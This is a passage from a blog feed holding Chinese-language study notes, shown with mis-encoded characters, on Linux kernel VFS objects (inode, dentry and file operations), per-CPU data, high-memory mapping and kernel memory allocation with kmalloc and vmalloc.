create(struct inode*dir, struct dentry*dentry, int mode)//ç›®å½•ä¸­å¯»æ‰¾ç´¢å¼•èŠ‚ç‚¹struct dentry loookup(struct inode *dir, struct dentry *dentry)//link()è°ƒç”¨ï¼Œåˆ›å»ºç¡¬è¿æ¥int link(struct dentry *old_dentry, struct inode *dir, struct dentry *dentry)//unlink()è°ƒç”¨ï¼Œåˆ é™¤dentryæŒ‡å®šçš„inodeint unlink(struct inode *dir, struct dentry *dentry)//symlinkè°ƒç”¨ï¼Œåˆ›å»ºè½¯è¿æ¥int unlink(struct inode *dir, struct dentry *dentryï¼Œ const char *symname)//mknodè°ƒç”¨ï¼Œåˆ›å»ºç‰¹æ®Šæ–‡ä»¶ã€‚åˆ›å»ºçš„æ–‡ä»¶æ”¾åœ¨dirï¼Œç›®å½•é¡¹dentryï¼Œå…³è”çš„è®¾å¤‡rdevint mknod(struct inode *dir, struct dentry *dentry, int mode, dev_t rdev)//readlink()è°ƒç”¨ï¼Œæ‹·è´æ•°æ®åˆ°ç‰¹å®šçš„bufferint readlink(struct dentry *dentry, char *buffer, int buflen)//ä»ç¬¦å·é“¾æ¥æŸ¥æ‰¾ç´¢å¼•èŠ‚ç‚¹ï¼Œç”±dentryè§£æï¼Œç»“æœå­˜æ”¾åœ¨ndæŒ‡å‘çš„nameidataç»“æ„ä½“ä¸­int follow_link(struct dentry *dentry, struct nameidata *nd)//æ¸…é™¤follow_linkint put_link(struct dentry *dentry, struct nameidata *nd)//ä¿®æ”¹æ–‡ä»¶çš„å¤§å°void truncate(struct inode* inode)//æ£€æŸ¥inodeæ‰€ä»£è¡¨çš„æ–‡ä»¶æ˜¯å¦å…è®¸ç‰¹å®šè®¿é—®æ¨¡å¼int permission(struct inode* inode, int mask)</code></pre><h2 id="13-9-ç›®å½•é¡¹å¯¹è±¡"><a href="#13-9-ç›®å½•é¡¹å¯¹è±¡" class="headerlink" title="13.9 ç›®å½•é¡¹å¯¹è±¡"></a>13.9 ç›®å½•é¡¹å¯¹è±¡</h2><p>æ¯ä¸ªdentryä»£è¡¨è·¯å¾„ä¸­çš„ä¸€ä¸ªç‰¹å®šéƒ¨åˆ†</p><p>å¸¸è§„çš„å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œæ‰§è¡Œè€—æ—¶ï¼Œä»£ç ç¹ç</p><p>ç›®å½•é¡¹å¯¹è±¡çš„å¼•å…¥ä½¿å¾—è¿‡ç¨‹æ›´ç®€å•</p><h3 id="13-9-1-ç›®å½•é¡¹çŠ¶æ€"><a href="#13-9-1-ç›®å½•é¡¹çŠ¶æ€" class="headerlink" title="13.9.1 ç›®å½•é¡¹çŠ¶æ€"></a>13.9.1 ç›®å½•é¡¹çŠ¶æ€</h3><p>ä¸‰ç§çŠ¶æ€ï¼šè¢«ä½¿ç”¨ï¼Œæœªè¢«ä½¿ç”¨å’Œè´ŸçŠ¶æ€</p><p>è¢«ä½¿ç”¨ï¼šå¯¹åº”ä¸€ä¸ªæœ‰æ•ˆçš„ç´¢å¼•èŠ‚ç‚¹ï¼Œæœ‰ä¸€ä¸ªå¤šä¸ªä½¿ç”¨è€…</p><p>è¢«ä½¿ç”¨ä¸èƒ½è¢«ä¸¢å¼ƒ</p><p>æœªè¢«ä½¿ç”¨ï¼šd_countä¸º0</p><p>è´ŸçŠ¶æ€ï¼šæ²¡æœ‰å¯¹åº”èŠ‚ç‚¹ï¼ˆNULLï¼‰ï¼Œç”¨äºç¡®è®¤è·¯å¾„ä¸å­˜åœ¨</p><h3 id="13-9-2-ç›®å½•é¡¹ç¼“å­˜"><a href="#13-9-2-ç›®å½•é¡¹ç¼“å­˜" class="headerlink" title="13.9.2 ç›®å½•é¡¹ç¼“å­˜"></a>13.9.2 ç›®å½•é¡¹ç¼“å­˜</h3><p>å°†å…ƒç´ é€ä¸ªè§£æä¸ºç›®å½•é¡¹ï¼Œæµªè´¹æ—¶é—´</p><p>å°†ç›®å½•é¡¹å¯¹è±¡ç¼“å­˜åœ¨dcacheä¸­</p><p>ä¸‰ä¸ªä¸»è¦éƒ¨åˆ†ï¼š</p><p>è¢«ä½¿ç”¨çš„ç›®å½•é¡¹é“¾è¡¨</p><p>æœ€è¿‘è¢«ä½¿ç”¨çš„åŒå‘é“¾è¡¨ï¼šåŒ…å«æœªè¢«ä½¿ç”¨çš„ï¼Œè´ŸçŠ¶æ€çš„</p><p>æ•£åˆ—è¡¨ï¼Œç›¸åº”çš„æ•£åˆ—å‡½æ•°</p><p>æ•£åˆ—è¡¨ç”±æ•°ç»„dentry_hashtableè¡¨ç¤ºï¼Œ å…ƒç´ ä¸ºæŒ‡å‘ç›¸åŒé”®å€¼çš„ç›®å½•é¡¹å¯¹è±¡é“¾è¡¨çš„æŒ‡é’ˆ</p><p>å®é™…çš„æ•£åˆ—å€¼ç”±d_hashå‡½æ•°è®¡ç®—ï¼šå†…æ ¸ç»™FSå”¯ä¸€çš„æ•£åˆ—å‡½æ•°</p><h2 id="13-10-ç›®å½•é¡¹æ“ä½œ"><a href="#13-10-ç›®å½•é¡¹æ“ä½œ" class="headerlink" title="13.10 ç›®å½•é¡¹æ“ä½œ"></a>13.10 ç›®å½•é¡¹æ“ä½œ</h2><pre><code>//æ¯”è¾ƒæ–‡ä»¶åæ˜¯å¦ç›¸åŒï¼Œå¯¹äºFATä¸åŒºåˆ†å¤§å°å†™int d_compare(struct dentry *dentry, struct qstr *name1, struct qstr* name2)</code></pre><h2 id="13-11-æ–‡ä»¶å¯¹è±¡"><a href="#13-11-æ–‡ä»¶å¯¹è±¡" class="headerlink" title="13.11 æ–‡ä»¶å¯¹è±¡"></a>13.11 æ–‡ä»¶å¯¹è±¡</h2><p>æ–‡ä»¶å¯¹è±¡åœ¨è¿›ç¨‹è§‚ç‚¹ä¸Šï¼Œä»£è¡¨æ‰“å¼€æ–‡ä»¶</p><p>OSè§†è§’ä¸Šç›®å½•é¡¹å¯¹è±¡ä»£è¡¨æ‰“å¼€æ–‡ä»¶ï¼Œinodeå’Œç›®å½•é¡¹å¯¹è±¡æ˜¯å”¯ä¸€çš„</p><p>è®°å½•æ–‡ä»¶æ˜¯å¦è„æ˜¯ç´¢å¼•èŠ‚ç‚¹è®°å½•çš„</p><h2 id="13-12-æ–‡ä»¶æ“ä½œ"><a href="#13-12-æ–‡ä»¶æ“ä½œ" class="headerlink" title="13.12 æ–‡ä»¶æ“ä½œ"></a>13.12 æ–‡ä»¶æ“ä½œ</h2><p>å¯¹ä¸æ„Ÿå…´è¶£çš„æ“ä½œå¯ç½®ä¸ºNULLï¼Œé€šç”¨æ“ä½œ</p><pre><code>//æ›´æ–°åç§»é‡æŒ‡é’ˆloff_t lleek(struct file *file, loff_t offset, int origin)//ä»offsetè¯»å–countå­—èŠ‚åˆ°bufï¼Œæ›´æ–°æ–‡ä»¶æŒ‡é’ˆssize_t read(struct file *file, char *buf, size_t count, loff_t offset)//ä»iocbæè¿°çš„æ–‡ä»¶é‡Œï¼ŒåŒæ­¥æ–¹å¼è¯»å–countå­—èŠ‚åˆ°bufã€‚ssize_t aio_read(struct kiocb *iocb, char *buf, size_t count, loff_t offset)//è¿”å›ç›®å½•åˆ—è¡¨ä¸­çš„ä¸‹ä¸€ä¸ªç›®å½•int readdir(struct file *file, struct poll_table_struct *poll_table)//æ‰€æœ‰è¢«ç¼“å­˜æ•°æ®å†™å›ç£ç›˜int fsync(struct file *file, struct dentry *dentry, int datasync)//æ‰“å¼€æˆ–å…³é—­å¼‚æ­¥IOçš„é€šå‘Šä¿¡å·int fasync(int fd, struct file*file, int on)//ä»ä¸€ä¸ªæ–‡ä»¶æ‹·è´æ•°æ®åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ï¼Œå…¨éƒ¨åœ¨å†…æ ¸å®Œæˆï¼Œé¿å…äº†å‘ç”¨æˆ·ä¸å¿…è¦çš„æ‹·è´ssize_t sendfile(struct file*file, loff_t *offset,size_t size, read_actor_t actor, void *target)//æä¾›å¿ å‘Šé”int flock(struct file *flip, int cmd, struct file_lock *fl)</code></pre><h2 id="13-13-å’Œæ–‡ä»¶ç³»ç»Ÿç›¸å…³çš„æ•°æ®ç»“æ„"><a href="#13-13-å’Œæ–‡ä»¶ç³»ç»Ÿç›¸å…³çš„æ•°æ®ç»“æ„" class="headerlink" title="13.13 å’Œæ–‡ä»¶ç³»ç»Ÿç›¸å…³çš„æ•°æ®ç»“æ„"></a>13.13 å’Œæ–‡ä»¶ç³»ç»Ÿç›¸å…³çš„æ•°æ®ç»“æ„</h2><h4 id="file-system-type"><a href="#file-system-type" class="headerlink" title="file_system_type"></a>file_system_type</h4><p>æè¿°å„ç§FSç±»å‹</p><h4 id="vfsmount"><a href="#vfsmount" class="headerlink" title="vfsmount"></a>vfsmount</h4><p>æè¿°ä¸€ä¸ªFSçš„å®ä¾‹</p><p>ç†æ¸…æ–‡ä»¶ç³»ç»Ÿå’Œå…¶å®ƒå®‰è£…ç‚¹çš„å…³ç³»ï¼Œæ˜¯æœ€å¤æ‚çš„å·¥ä½œ</p><p>vsmountä¸­çš„å„ç§é“¾è¡¨ï¼Œç”¨äºè·Ÿè¸ªç›¸å…³ä¿¡æ¯</p><p>æ ‡å‡†å®‰è£…æ ‡å¿—åˆ—è¡¨</p><table><thead><tr><th>æ ‡å¿—</th><th>æè¿°</th></tr></thead><tbody><tr><td>MNT_NOSUID</td><td>ç¦æ­¢exeè®¾ç½®setuid,setgidæ ‡å¿—</td></tr><tr><td>MNT_MODEV</td><td>ç¦æ­¢è®¿é—®è¯¥FSä¸Šçš„è®¾å¤‡æ–‡ä»¶</td></tr><tr><td>MNT_NOEXEC</td><td>ç¦æ­¢æ‰§è¡ŒFSä¸Šçš„exe</td></tr></tbody></table><h2 id="13-14-è¿›ç¨‹ç›¸å…³æ•°æ®ç»“æ„"><a href="#13-14-è¿›ç¨‹ç›¸å…³æ•°æ®ç»“æ„" class="headerlink" title="13.14 è¿›ç¨‹ç›¸å…³æ•°æ®ç»“æ„"></a>13.14 è¿›ç¨‹ç›¸å…³æ•°æ®ç»“æ„</h2><p>æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ç»„è‡ªå·±æ‰“å¼€çš„æ–‡ä»¶</p><h4 id="files-struct"><a href="#files-struct" class="headerlink" title="files_struct"></a>files_struct</h4><pre><code>struct files_struct&#123;    atomic_t count;    ...    struct file *fd_array[NR_OPEN_DEFAULT];&#125;</code></pre><p>å¯å®¹çº³64ä¸ªæ–‡ä»¶å¯¹è±¡</p><p>è‹¥è¶…è¿‡64ï¼Œåˆ†é…ä¸€ä¸ªæ–°æ•°ç»„</p><p>å¯ä»¥é€‚å½“å¢å¤§NR_OPEN_DEFAULTçš„é¢„å®šä¹‰</p><p>count:å¯ä»¥è®©å¤šä¸ªè¿›ç¨‹å…±äº«ç»“æ„ä½“ï¼Œè®¡æ•°é˜²æ­¢æ’¤é”€</p><h4 id="fs-struct"><a href="#fs-struct" class="headerlink" title="fs_struct"></a>fs_struct</h4><p>åŒ…æ‹¬æ–‡ä»¶ç³»ç»Ÿå’Œè¿›ç¨‹çš„ç›¸å…³ä¿¡æ¯</p><h4 id="mmt-namespace"><a href="#mmt-namespace" class="headerlink" title="mmt_namespace"></a>mmt_namespace</h4><p>å•è¿›ç¨‹å‘½åç©ºé—´</p><p>æ¯ä¸€ä¸ªè¿›ç¨‹åœ¨ç³»ç»Ÿä¸­éƒ½çœ‹åˆ°ä¸ºä¸€ä¸ªå®‰è£…æ–‡ä»¶ç³»ç»Ÿ</p><p>é»˜è®¤æƒ…å†µï¼Œæ‰€æœ‰è¿›ç¨‹å…±äº«åŒæ ·çš„å‘½åç©ºé—´</p><h2 id="13-15-å°ç»“"><a href="#13-15-å°ç»“" class="headerlink" title="13.15 å°ç»“"></a>13.15 å°ç»“</h2>]]></content>
      
      
      
        <tags>
            
            <tag> study notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023925</title>
      <link href="/2023/09/25/2023-9-25/"/>
      <url>/2023/09/25/2023-9-25/</url>
      
        <content type="html"><![CDATA[<h1 id="å†…å­˜ç®¡ç†"><a href="#å†…å­˜ç®¡ç†" class="headerlink" title="å†…å­˜ç®¡ç†"></a>å†…å­˜ç®¡ç†</h1><h2 id="12-7"><a href="#12-7" class="headerlink" title="12.7"></a>12.7</h2><h3 id="12-7-1"><a href="#12-7-1" class="headerlink" title="12.7.1"></a>12.7.1</h3><p>ä¸­æ–­æ ˆ</p><h3 id="12-7-2-æ ˆä¸Šæ­£å¤§å…‰æ˜å·¥ä½œ"><a href="#12-7-2-æ ˆä¸Šæ­£å¤§å…‰æ˜å·¥ä½œ" class="headerlink" title="12.7.2 æ ˆä¸Šæ­£å¤§å…‰æ˜å·¥ä½œ"></a>12.7.2 æ ˆä¸Šæ­£å¤§å…‰æ˜å·¥ä½œ</h3><p>å°½é‡åŠ¨æ€åˆ†é…ï¼Œå†…æ ¸æ ˆæœ‰é™</p><h2 id="12-8-é«˜ç«¯å†…å­˜çš„æ˜ å°„"><a href="#12-8-é«˜ç«¯å†…å­˜çš„æ˜ å°„" class="headerlink" title="12.8 é«˜ç«¯å†…å­˜çš„æ˜ å°„"></a>12.8 é«˜ç«¯å†…å­˜çš„æ˜ å°„</h2><h3 id="12-8-1-æ°¸ä¹…æ˜ å°„"><a href="#12-8-1-æ°¸ä¹…æ˜ å°„" class="headerlink" title="12.8.1 æ°¸ä¹…æ˜ å°„"></a>12.8.1 æ°¸ä¹…æ˜ å°„</h3><p>æ˜ å°„pageåˆ°å†…æ ¸åœ°å€ç©ºé—´</p><pre><code>void *kmap(struct page *page)</code></pre><p>ä½ç«¯å†…å­˜ï¼šè¿”å›è™šæ‹Ÿåœ°å€</p><p>é«˜ç«¯å†…å­˜ï¼šå»ºç«‹æ°¸ä¹…æ˜ å°„ï¼Œå¹¶è¿”å›åœ°å€</p><p>kmapå¯ç¡çœ </p><p>æ°¸ä¹…æ˜ å°„æœ‰é™ï¼Œé«˜ç«¯å†…å­˜ä¸éœ€è¦æ—¶å€™åº”è¯¥è§£é™¤æ˜ å°„</p><pre><code>void kunmap(struct page *page)</code></pre><h3 id="12-8-2-ä¸´æ—¶æ˜ å°„ï¼ˆåŸå­æ˜ å°„ï¼‰"><a href="#12-8-2-ä¸´æ—¶æ˜ å°„ï¼ˆåŸå­æ˜ å°„ï¼‰" class="headerlink" title="12.8.2 ä¸´æ—¶æ˜ å°„ï¼ˆåŸå­æ˜ å°„ï¼‰"></a>12.8.2 ä¸´æ—¶æ˜ å°„ï¼ˆåŸå­æ˜ å°„ï¼‰</h3><p>åˆ›å»ºæ˜ å°„ä¸”ä¸Šä¸‹æ–‡ä¸èƒ½ç¡çœ </p><pre><code>void *kmap_atomic(struct page*page, enum km_type type)</code></pre><p>typeæè¿°äº†ä¸´æ—¶æ˜ å°„çš„ç›®çš„</p><p>ä¸ä¼šé˜»å¡</p><p>ç¦æ­¢å†…æ ¸æŠ¢å ï¼Œæ¯ä¸ªæ˜ å°„å¯¹æ¯ä¸ªå¤„ç†å™¨å”¯ä¸€</p><pre><code>void kunmap_atomic(void *kvaddr, enum_type type)</code></pre><h2 id="12-9-æ¯ä¸ªCPUçš„åˆ†é…"><a href="#12-9-æ¯ä¸ªCPUçš„åˆ†é…" class="headerlink" title="12.9 æ¯ä¸ªCPUçš„åˆ†é…"></a>12.9 æ¯ä¸ªCPUçš„åˆ†é…</h2><p>æ¯ä¸ªCPUçš„æ•°æ®å­˜åœ¨ä¸€ä¸ªæ•°ç»„é‡Œ</p><p>æŒ‰å½“å‰å¤„ç†å™¨å·å†³å®šè¿™ä¸ªæ•°ç»„çš„å½“å‰å…ƒç´ </p><pre><code>unsigned long my_percpu[NR_CPUS];int cpu;cpu = get_cpu();my_percpu[cpu]++; //å…·ä½“æ‰§è¡Œçš„ä»£ç put_cpu();</code></pre><p>ä¸å­˜åœ¨å¹¶å‘é—®é¢˜</p><p>å†…æ ¸æŠ¢å é—®é¢˜ï¼š</p><ul><li>ä»£ç è¢«å…¶å®ƒå¤„ç†å™¨æŠ¢å ï¼Œé‡æ–°è°ƒåº¦ï¼ŒCPUå˜é‡æ— æ•ˆ</li><li>åŒä¸€ä¸ªå¤„ç†å™¨æŠ¢å äº†ä¸¤ä¸ªï¼Œé€ æˆç«äº‰</li></ul><p>get_cpu()æ—¶ç¦æ­¢å†…æ ¸æŠ¢å ï¼Œput_cpu()æ—¶é‡æ–°æ¿€æ´»å¤„ç†å™¨</p><h2 id="12-10-æ–°çš„æ¯ä¸ªCPUæ¥å£"><a href="#12-10-æ–°çš„æ¯ä¸ªCPUæ¥å£" class="headerlink" title="12.10 æ–°çš„æ¯ä¸ªCPUæ¥å£"></a>12.10 æ–°çš„æ¯ä¸ªCPUæ¥å£</h2><p>2.6å†…æ ¸ä¸ºäº†æ–¹ä¾¿æ“ä½œæ¯ä¸ªCPUæ•°æ®ï¼Œå¼•å…¥percpu</p><p>&lt;linux/percpu.h&gt;å£°æ˜äº†æ‰€æœ‰æ¥å£æ“ä½œä¾‹ç¨‹</p><h3 id="12-10-1-ç¼–è¯‘æ—¶æ¯ä¸ªCPUæ•°æ®"><a href="#12-10-1-ç¼–è¯‘æ—¶æ¯ä¸ªCPUæ•°æ®" class="headerlink" title="12.10.1 ç¼–è¯‘æ—¶æ¯ä¸ªCPUæ•°æ®"></a>12.10.1 ç¼–è¯‘æ—¶æ¯ä¸ªCPUæ•°æ®</h3><pre><code>DEFINE_PER_CPU(type, name);</code></pre><p>ä¸ºæ¯ä¸ªå¤„ç†å™¨åˆ›å»ºç±»å‹ä¸ºtypeï¼Œåå­—ä¸ºnameçš„å˜é‡å®ä¾‹</p><p>åœ¨åˆ«å¤„å£°æ˜å˜é‡ï¼š</p><pre><code>DECLARE_PER_CPU(type, name);</code></pre><p>get_cpu, put_cpuæ“ä½œå˜é‡</p><pre><code>get_cpu_var(name)++;put_cpu_var(name);</code></pre><p>ä¹Ÿå¯ä»¥</p><pre><code>per_cpu(name, cpu)++;</code></pre><p>æ­¤æ–¹æ³•ä¸ä¼šç¦æ­¢å†…æ ¸æŠ¢å ï¼Œä¹Ÿä¸ä¼šæä¾›é”ä¿æŠ¤</p><p>é“¾æ¥ç¨‹åºå°†ä»–ä»¬åˆ›æ·åœ¨ä¸€ä¸ªå”¯ä¸€çš„å¯æ‰§è¡Œæ®µä¸­.data.percpu</p><h3 id="12-10-2-è¿è¡Œæ—¶çš„æ¯ä¸ªCPUæ•°æ®"><a href="#12-10-2-è¿è¡Œæ—¶çš„æ¯ä¸ªCPUæ•°æ®" class="headerlink" title="12.10.2 è¿è¡Œæ—¶çš„æ¯ä¸ªCPUæ•°æ®"></a>12.10.2 è¿è¡Œæ—¶çš„æ¯ä¸ªCPUæ•°æ®</h3><p>å†…æ ¸å®ç°CPUæ•°æ®åŠ¨æ€åˆ†é…ç±»ä¼¼kmalloc</p><pre><code>void *alloc_percpu(type);void *__alloc_percpu(size_t size, size_t align);void free_percpu(const void *);</code></pre><p>alloc_percpu:å•å­—èŠ‚å¯¹é½ï¼ŒæŒ‰ç…§ç»™å®šç±»å‹çš„è‡ªç„¶è¾¹ç•Œå¯¹é½</p><p>__alloc_percpu:æŒ‡å®šå¯¹é½</p><p>è¿”å›ä¸€ä¸ªæŒ‡é’ˆï¼Œç”¨æ¥å¼•ç”¨CPUæ•°æ®</p><pre><code>get_cpu_var(ptr);put_cpu_var(prt);</code></pre><h2 id="12-11-ä½¿ç”¨æ¯ä¸ªCPUæ•°æ®çš„åŸå› "><a href="#12-11-ä½¿ç”¨æ¯ä¸ªCPUæ•°æ®çš„åŸå› " class="headerlink" title="12.11 ä½¿ç”¨æ¯ä¸ªCPUæ•°æ®çš„åŸå› "></a>12.11 ä½¿ç”¨æ¯ä¸ªCPUæ•°æ®çš„åŸå› </h2><ol><li>å‡å°‘äº†æ•°æ®é”å®šï¼Œä¸å†éœ€è¦é”ï¼ˆçº¯ç²¹çš„ç¼–ç¨‹çº¦å®šï¼Œä¸å­˜åœ¨å¼ºåˆ¶æªæ–½ï¼‰</li><li>å¤§å¤§å‡å°‘ç¼“å­˜å¤±æ•ˆ,percpuæ¥å£ç¼“å­˜å¯¹é½ï¼ˆcache alignï¼‰æ‰€æœ‰æ•°æ®</li></ol><p>å”¯ä¸€çš„å®‰å…¨è¦æ±‚ï¼šç¦æ­¢å†…æ ¸æŠ¢å ï¼ˆput, get)ï¼Œä¸èƒ½ç¡çœ </p><h2 id="12-12-åˆ†é…å‡½æ•°çš„é€‰æ‹©"><a href="#12-12-åˆ†é…å‡½æ•°çš„é€‰æ‹©" class="headerlink" title="12.12 åˆ†é…å‡½æ•°çš„é€‰æ‹©"></a>12.12 åˆ†é…å‡½æ•°çš„é€‰æ‹©</h2><ul><li>å¸¸ç”¨ï¼škmalloc() GFP_ATOMIC æˆ– GFP_KERNEL</li><li>é«˜ç«¯å†…å­˜ï¼šalloc_pages()+kmap()</li><li>vmalloc():åˆ†é…å¤§æ®µå†…å­˜</li><li>slabï¼šé’ˆå¯¹åˆ›å»ºæ’¤é”€å¾ˆå¤šå¤§çš„æ•°æ®ç»“æ„</li></ul><h2 id="12-13-å°ç»“"><a href="#12-13-å°ç»“" class="headerlink" title="12.13 å°ç»“"></a>12.13 å°ç»“</h2>]]></content>
      
      
      
        <tags>
            
            <tag> study notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023921</title>
      <link href="/2023/09/21/2023-9-21/"/>
      <url>/2023/09/21/2023-9-21/</url>
      
        <content type="html"><![CDATA[<h1 id="å†…å­˜ç®¡ç†"><a href="#å†…å­˜ç®¡ç†" class="headerlink" title="å†…å­˜ç®¡ç†"></a>å†…å­˜ç®¡ç†</h1><p>linuxå†…æ ¸è®¾è®¡ä¸å®ç°ç¬¬12ç« ç¬”è®°</p><h2 id="1-é¡µ"><a href="#1-é¡µ" class="headerlink" title="1.é¡µ"></a>1.é¡µ</h2><h2 id="2-åŒº"><a href="#2-åŒº" class="headerlink" title="2.åŒº"></a>2.åŒº</h2><p>å¯¹ç›¸ä¼¼ç‰¹æ€§çš„é¡µåˆ†ç»„</p><p>ç›®çš„ï¼šæŸäº›ç¡¬ä»¶å­˜åœ¨ç¼ºé™·ï¼Œæ— æ³•å¯»å€</p><ul><li>åªèƒ½ç”¨ç‰¹å®šå†…å­˜DMA</li><li>ç‰©ç†å¯»å€èŒƒå›´å¤§äºè™šæ‹Ÿå¯»å€èŒƒå›´</li></ul><p>å››ç§åŒº</p><ul><li>ZONE_DMA</li><li>ZONE_DMA32</li><li>ZONE_NORMAL</li><li>ZONE_HIGHEMï¼šé«˜ç«¯å†…å­˜ï¼Œé¡µä¸èƒ½æ°¸ä¹…æ˜ å°„åˆ°å†…æ ¸åœ°å€</li></ul><p>ä¸ä¸€å®šè¦å®šä¹‰æ‰€æœ‰åŒº</p><h2 id="3-è·å¾—é¡µ"><a href="#3-è·å¾—é¡µ" class="headerlink" title="3.è·å¾—é¡µ"></a>3.è·å¾—é¡µ</h2><p>åº•å±‚æ¥å£&lt;linux/gfp.h&gt;ï¼Œå‡½æ•°ï¼š</p><p>struct pages *alloc_pages(gfp_mask, order)</p><p>åˆ†é…1&lt;&lt;orderä¸ªè¿ç»­çš„ç‰©ç†é¡µï¼Œè¿”å›ç¬¬ä¸€ä¸ªé¡µçš„structç»“æ„ä½“</p><p>void * page_address(struct page *page)</p><p>è¿”å›æŒ‡é’ˆï¼ŒæŒ‡å‘ç»™å®šç‰©ç†é¡µçš„é€»è¾‘åœ°å€</p><p>unsigned long __get_free_pages(fgp_mask, order)</p><p>ä¸alloc_pagesä¸€æ ·ï¼Œè¿”å›ç¬¬ä¸€ä¸ªé¡µçš„é€»è¾‘åœ°å€</p><h2 id="è·å¾—å¡«å……ä¸º0çš„é¡µ"><a href="#è·å¾—å¡«å……ä¸º0çš„é¡µ" class="headerlink" title="è·å¾—å¡«å……ä¸º0çš„é¡µ"></a>è·å¾—å¡«å……ä¸º0çš„é¡µ</h2><p>unsigned long get_zeroed_page(gfp_mask)</p><h2 id="é‡Šæ”¾é¡µ"><a href="#é‡Šæ”¾é¡µ" class="headerlink" title="é‡Šæ”¾é¡µ"></a>é‡Šæ”¾é¡µ</h2><p>8ä¸ªé¡µçš„ä½¿ç”¨ä¸é‡Šæ”¾</p><pre class=" language-c"><code class="language-c">page <span class="token operator">=</span> <span class="token function">__get_free_pages</span><span class="token punctuation">(</span>GFP_KERNEL<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>page<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/* pageæŒ‡å‘é€»è¾‘åœ°å€ */</span><span class="token function">free_pages</span><span class="token punctuation">(</span>page<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="4-kmalloc"><a href="#4-kmalloc" class="headerlink" title="4.kmalloc"></a>4.kmalloc</h2><p>void *kmalloc(size_t size, gfp_t flags)</p><p>åˆ†é…çš„å†…å­˜åŒºï¼Œç‰©ç†ä¸Šè¿ç»­</p><p>å¦‚æœæ˜¯NULLï¼Œéœ€è¦å¤„ç†é”™è¯¯</p><p>è°ƒç”¨æˆåŠŸï¼Œè¿”å›é€»è¾‘åœ°å€ï¼Œå†…å­˜å—çš„å¤§å°è‡³å°‘ä¸ºè¯·æ±‚çš„å¤§å°</p><h2 id="gfp-maskæ ‡å¿—"><a href="#gfp-maskæ ‡å¿—" class="headerlink" title="gfp_maskæ ‡å¿—"></a>gfp_maskæ ‡å¿—</h2><p>åˆ†ä¸ºè¡Œä¸ºä¿®é¥°ç¬¦ï¼ŒåŒºä¿®é¥°ç¬¦åŠç±»å‹</p><ol><li><p>è¡Œä¸ºä¿®é¥°ç¬¦</p><p>æè¿°åˆ†é…å™¨çš„å…·ä½“ç‰¹å¾</p><p>ä¾‹å­</p><pre><code>ptr = kmalloc(size, __GFP_WAIT|__GFP_IO|__GFP_FS);</code></pre><p>å¯ä»¥é˜»å¡ï¼Œæ‰§è¡ŒIOï¼Œå¿…è¦æ—¶å¯ä»¥æ‰§è¡ŒFSæ“ä½œ</p></li><li><p>åŒºä¿®é¥°ç¬¦</p><p>é»˜è®¤ä»ZONE_NORMALåˆ†é…</p><p>ä¸èƒ½ç»™get_free_pages(),kmalloc()æŒ‡å®šZONE_HIGHMEMï¼Œå› ä¸ºä¸èƒ½è¿”å›å›ºå®šçš„é€»è¾‘åœ°å€</p></li><li><p>ç±»å‹æ ‡å¿—</p><p>æŒ‡å®šæ‰€éœ€çš„è¡Œä¸ºå’ŒåŒºæè¿°ç¬¦ï¼ˆå¤šä¸ªçš„å¤åˆï¼‰</p><table><thead><tr><th>æ ‡å¿—</th><th>ä¿®é¥°ç¬¦æ ‡å¿—</th></tr></thead><tbody><tr><td>GFP_KERNEL</td><td>(__GFP_WAIT|__GFP_IO|__GFP_FS)</td></tr><tr><td>GFP_ATOMIC</td><td>__GFP_HIGH</td></tr><tr><td>GFP_NOIO</td><td>__GFP_WAIT</td></tr><tr><td>GFP_NOFS</td><td>__GFP_WAIT|__GFP_IO</td></tr></tbody></table><p>GFP_KERNEL:å¯èƒ½ç¡çœ ï¼Œæ™®é€šä¼˜å…ˆçº§,æœ€å¸¸ç”¨</p><p>å¯ä»¥ç”¨åœ¨å¯ä»¥é‡æ–°å®‰å…¨è°ƒåº¦çš„è¿›ç¨‹context</p><p>GFP_ATOMIC: ä¸èƒ½å¹²ä»»ä½•äº‹ï¼Œåˆ†é…æˆåŠŸæœºä¼šè¾ƒå°ï¼Œé€‚ç”¨äºä¸èƒ½ç¡çœ çš„æƒ…å†µï¼ˆä¸­æ–­å¤„ç†ç¨‹åºï¼Œè½¯ä¸­æ–­,taskletï¼‰</p><p>GFP_NOFS:ç”¨åœ¨FSä»£ç ä¸­ï¼Œå¦‚æœæ²¡æœ‰ç”¨GFP_NOFSï¼Œä¼šå¼•èµ·æ›´å¤šçš„æ–‡ä»¶ç³»ç»Ÿæ“ä½œï¼Œå½¢æˆå¥—å¨ƒï¼Œæœ€åæ­»é”</p><p><strong>ç»å¤§å¤šæ•°ä»£ç ä¸­ï¼Œè¦ä¹ˆGFP_KERNEL,è¦ä¹ˆGFP_ATOMIC</strong></p></li></ol><h2 id="kfree"><a href="#kfree" class="headerlink" title="kfree()"></a>kfree()</h2><h2 id="5-vmalloc"><a href="#5-vmalloc" class="headerlink" title="5.vmalloc()"></a>5.vmalloc()</h2><p>ç±»ä¼¼kmalloc()ï¼Œå‰è€…çš„è™šæ‹Ÿåœ°å€è¿ç»­ï¼Œç‰©ç†åœ°å€ä¸éœ€è¦è¿ç»­</p><p>å¤§å¤šæ•°æƒ…å†µï¼Œåªæœ‰ç¡¬ä»¶è®¾å¤‡éœ€è¦ç‰©ç†åœ°å€è¿ç»­çš„è®¾å¤‡</p><p>kmallocæœ‰æ›´å¥½çš„æ€§èƒ½ï¼Œå› æ­¤vmallocä¸å¾—å·²æ‰ä¼šä½¿ç”¨-ã€‹è·å¾—å¤§æ®µå†…å­˜</p><p>ä¾‹å¦‚æ¨¡å—è¢«åŠ¨æ€æ’å…¥åˆ°å†…æ ¸ä¸­</p><p>ç”¨æ³•ä¸ç”¨æˆ·ç©ºé—´ä¸€æ ·ï¼švoid *vmalloc(unsigned long size)</p><p>void vfree(const 